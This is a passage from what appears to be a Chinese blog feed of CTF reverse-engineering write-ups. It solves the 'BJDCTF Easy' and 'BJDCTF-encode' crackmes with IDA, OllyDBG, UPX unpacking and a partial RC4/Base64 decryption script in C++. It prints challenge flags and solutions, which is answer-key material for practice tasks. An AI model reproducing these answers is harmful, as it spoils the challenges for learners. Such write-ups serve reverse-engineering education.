<span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    result <span class="token operator">=</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// '\n'</span></code></pre><p>程序会输出 <code>&#39;*&#39;</code> 、<code>&#39; &#39;</code> 、<code>&#39;\n&#39;</code> 三种字符，而且函数名 <code>__ques</code> 让人联想到 question，这个函数很可能与 flag 有关</p></li><li><p>完整的 <code>__ques</code> 函数：<br><img src="https://s2.loli.net/2023/03/18/ZkAVdiQtmqYyR75.png" alt="BJDCTF-Easy4.png"></p></li><li><p>将这个函数拷贝出来，在 CLion 中跑一遍<br>但是 <code>LODWORD</code>、<code>HIDWORD</code> 两个函数总是报错，导入库 <code>#incluede&lt;windows.h&gt;</code><br>或者自己定义：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">LODWORD</span><span class="token expression"><span class="token punctuation">(</span>l<span class="token punctuation">)</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HIDWORD</span><span class="token expression"><span class="token punctuation">(</span>l<span class="token punctuation">)</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></code></pre><p>都会报错，实在没办法了</p></li><li><p>但是由于 <code>LODWORD(l)</code> 的作用就是取数据 l 的 低 32位，<code>HIDWORD(l)</code> 就是取数据 l 的 高 32位<br>尝试手动实现该功能：<br>将：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">LODWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>  </code></pre><p>替换为：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">v6 <span class="token operator">=</span> v0 <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>虽然能跑，但是有几个位置输出不全：<br><img src="https://s2.loli.net/2023/03/18/cB7MOKXRiCzJEqU.png" alt="BJDCTF-Easy5.png"></p></li><li><p><em><strong>大致能看出该程序打印的是一些字符，大概率就是 flag 了<br>既然 flag 是由该程序输出，而 main 中却并没有调用该函数，因此才导致 main 函数的内容看起来和 flag 无关，因此只需要手动让该程序执行 <code>__ques</code> 函数就可以了</strong></em></p></li><li><p><mark>这里使用 OllyDBG 进行动态调试</mark><br>首先在 IDA 中注意到函数 <code>__ques</code> 的起始地址：<code>0x00401520</code><br><img src="https://s2.loli.net/2023/03/18/Pht6icTBpHYUSfE.png" alt="BJDCTF-Easy6.png"><br>在 OllyDBG 中 <code>ctrl + g</code> 定位到该地址：<br><img src="https://s2.loli.net/2023/03/18/yoj7eJ59cCzXlA3.png" alt="BJDCTF-Easy7.png"><br>在 <code>__ques</code> 函数入口处 F2 下断点<br>并<mark>将此位置设置为新 EIP，即让程序直接从这里开始执行</mark><br><img src="https://s2.loli.net/2023/03/18/fKDqovY64SBcP8L.png" alt="BJDCTF-Easy8.png"><br>同样，在 IDA 中找到 <code>__ques</code> 函数的结束地址：<code>0x00401723</code>（在 retn 返回之前）<br><img src="https://s2.loli.net/2023/03/18/z2F9kX3pu8S7aUe.png" alt="BJDCTF-Easy9.png"><br>在 OllyDBG 中该地址处 F2 下断点，便于查看 <code>__ques</code> 函数的输出信息：<br><img src="https://s2.loli.net/2023/03/18/s4lnyfezOJ3DVdI.png" alt="BJDCTF-Easy10.png"><br>F9 运行程序：<br><img src="https://s2.loli.net/2023/03/18/RnAxKjpMtS4kTO8.png" alt="BJDCTF-Easy11.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>HACKIT4FUN</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/l9nk8HcWofER1AJ.png" alt="BJDCTF-Easy12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-encode</title>
      <link href="/2023/035da1d030.html"/>
      <url>/2023/035da1d030.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>要求能看出伪代码中的加密算法，本题中的 Base64 和 RC4</mark></li></ul><hr><p><a href="https://www.ctfer.vip/problem/701">BJDCTF-encode</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>先进行常规 upx 脱壳【脱壳机好像有问题，用 cmd 脱壳，<code>upx -d &lt;文件名&gt;</code>】</p></li><li><p>没有 main 函数，shift + F12 查看字符串，发现与 flag 有关的信息<br><img src="https://s2.loli.net/2023/03/18/p8bWIwDdBV3JU5X.png" alt="BJDCTF-encode1.png"><br>在 IDA View-A 中跟进<br><img src="https://s2.loli.net/2023/03/18/gvyHns2PQdDARTj.png" alt="BJDCTF-encode2.png"><br>进入函数 sub_804887C<br><img src="https://s2.loli.net/2023/03/18/7OTGQPnI6vzJba1.png" alt="BJDCTF-encode3.png"></p></li><li><p><mark>根据经验，将一些函数进行 rename</mark>，得到代码如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_804887C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-FCh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-F8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-F4h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ah] [ebp-EEh] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">178</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ah] [ebp-BEh] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+FCh] [ebp-Ch]</span>  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"Flag&#123;This_a_Flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">21</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_8048AC2</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v4<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v5<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^=</span> v5<span class="token punctuation">[</span>i <span class="token operator">%</span> v3<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">sub_8048E24</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v7 <span class="token punctuation">)</span>    <span class="token function">sub_806FA00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>那么就只存在两处函数不明确作用，一个是 <code>sub_8048AC2</code>，一个是 <code>sub_8048E24</code></p></li><li><p>查看函数 <code>sub_8048AC2</code> ：<br><img src="https://s2.loli.net/2023/03/18/JTFYxSNea793IRU.png" alt="BJDCTF-encode4.png"><br>查看 <code>a0123456789Abcd</code> 中的内容：<br><img src="https://s2.loli.net/2023/03/18/PekUHgAOvopLiSK.png" alt="BJDCTF-encode5.png"><br>发现 <code>a0123456789Abcd</code> 是 Base64 加密的码表，根据 <code>sub_8048AC2</code> 函数的结构，可以判断这可能是 Base64 加密的算法</p></li><li><p>查看函数 <code>sub_8048E24</code><br><img src="https://s2.loli.net/2023/03/18/Z3GYB9Ocunri1KC.png" alt="BJDCTF-encode6.png"><br>根据函数调用，查看函数 <code>sub_8048CC2</code> ：<br><img src="https://s2.loli.net/2023/03/18/E1jTVOx28neiBo7.png" alt="BJDCTF-encode7.png"><br>基本可以断定，<code>sub_8048CC2</code> 函数是一个 RC4 算法的加密初始化，那么 <code>sub_8048E24</code> 就是 RC4 加密的算法</p></li><li><p>得到最终的程序逻辑：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_804887C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-FCh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-F8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-F4h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ah] [ebp-EEh] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">178</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ah] [ebp-BEh] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+FCh] [ebp-Ch]</span>  v7 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"Flag&#123;This_a_Flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"E8D8BD91871A1E56F53F4889682F96142AF2AB8FED7ACFD5E"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">21</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">Base64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v4<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v5<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^=</span> v5<span class="token punctuation">[</span>i <span class="token operator">%</span> v3<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">RC4</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v7 <span class="token punctuation">)</span>    <span class="token function">sub_806FA00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>经过分析，逻辑就是 <code>rc4(xor(base64(input)))</code>，key是 <code>Flag&#123;This_a_Flag&#125;</code>，但最终 cipher 是有点问题的，需要手动 Base16 解密成字节码才能用</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ULONG<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span>    <span class="token comment">//初始化函数</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span>    <span class="token comment">//加解密</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>k <span class="token operator">&lt;</span> Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        i<span class="token operator">=</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[x]和s[y]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>        t<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">FindIndex</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">,</span><span class="token keyword">char</span> c<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> output<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>string <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> input_length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input_length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">2</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>output<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">FindIndex</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>input<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span> <span class="token operator">>=</span> input_length<span class="token punctuation">)</span> 